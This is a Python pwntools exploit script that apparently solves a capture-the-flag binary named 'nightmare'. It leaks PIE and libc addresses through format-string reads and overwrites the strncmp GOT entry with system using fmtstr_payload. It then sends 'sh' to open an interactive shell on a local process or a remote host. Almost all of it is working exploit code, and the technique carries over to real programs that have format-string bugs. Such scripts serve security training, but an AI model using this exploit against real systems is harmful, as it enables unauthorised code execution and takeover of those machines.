from pwn import *

gs = '''
continue
'''

elf = context.binary = ELF("./nightmare")
libc = ELF("./libc6_2.31-0ubuntu7_amd64.so")

def start():
    if args.REMOTE:
        return remote("94.237.59.63", 48730)
        #return remote("127.0.0.1", 1337)
    else:
        if args.GDB:
            return gdb.debug(elf.path, gdbscript=gs)
        else:
            return process(elf.path)

context.terminal = ['gnome-terminal', '-e']
io = start()

i = 1

io.sendlineafter(b"> ", b"2")
io.sendlineafter(b"Enter the escape code>> ", f"%{i}$p".encode())
#print(f"[+] {i} : {io.recvline().decode()}")

leak_pie_address = int(io.recvline().decode().strip(), 16)

elf.address = leak_pie_address - 0x2079

print(f"[+] elf.got.strncmp: {hex(elf.got.strncmp)}")

i = 13 # Libc: __libc_start_main+231 # __libc_start_main_ret en otras palabras

io.sendlineafter(b"> ", b"2")
io.sendlineafter(b"Enter the escape code>> ", f"%{i}$p\x00".encode())
#print(f"[+] {i} : {io.recvline().decode()}")

leak_libc_address = int(io.recvline().decode().strip(), 16)

#libc.address = (leak_libc_address - 231) - libc.sym.__libc_start_main

libc.address = (leak_libc_address) - 0x270b3

print(f"[+] system: {hex(libc.sym.system)}")

offset = 5

writes_dict = {
    elf.got.strncmp: libc.sym.system
}

payload = fmtstr_payload(offset, writes_dict, write_size='short')

io.sendlineafter(b"> ", b"1")
io.sendlineafter(b">> ", payload)

io.sendlineafter(b"> ", b"2")
io.sendlineafter(b"Enter the escape code>> ", b"sh")

io.interactive()
